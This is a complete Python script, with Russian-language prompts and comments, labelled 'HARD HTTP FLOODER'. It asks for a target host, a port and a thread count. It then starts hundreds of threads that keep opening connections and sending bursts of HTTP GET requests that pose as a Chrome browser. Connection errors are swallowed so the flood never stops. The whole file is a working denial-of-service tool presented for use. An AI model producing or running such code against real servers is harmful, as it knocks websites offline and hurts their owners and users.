import socket
import threading
import sys
import time
import os

os.system("clear")
print("=== HARD HTTP FLOODER ===")
print("")

target_ip = input("IP Target (или домен): ")
target_port = int(input("Port (80 для HTTP или 443 для HTTPS): "))
num_threads = int(input("Количество потоков (например, 300-500): "))

# Формируем стандартный HTTP-запрос, который нагружает веб-сервер
payload = (
    f"GET / HTTP/1.1\r\n"
    f"Host: {target_ip}\r\n"
    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n"
    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    f"Connection: keep-alive\r\n\r\n"
).encode('utf-8')

counter = 0
lock = threading.Lock()

def attack_worker():
    global counter
    while True:
        try:
            # Создаем TCP-сокет (именно для веб-серверов)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            
            # Подключаемся к конкретному порту сайта (без изменений на порт 54!)
            s.connect((target_ip, target_port))
            
            # Шлем HTTP-пакеты пачкой
            for _ in range(10):
                s.sendall(payload)
            
            s.close()
            
            with lock:
                counter += 10
                print(f"[+] Отправлено запросов: {counter} (Порт: {target_port})", end="\r")
        except:
            # Ошибки соединения игнорируем, чтобы цикл не останавливался
            pass

os.system("clear")
print(f"[*] Атака запущена на {target_ip}:{target_port}")
print("[*] Для остановки нажмите Ctrl+C\n")

# Запуск потоков
for _ in range(num_threads):
    t = threading.Thread(target=attack_worker)
    t.daemon = True
    t.start()

# Удержание главного потока
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print(f"\n\n[!] Остановлено пользователем. Всего запросов: {counter}")
    sys.exit()
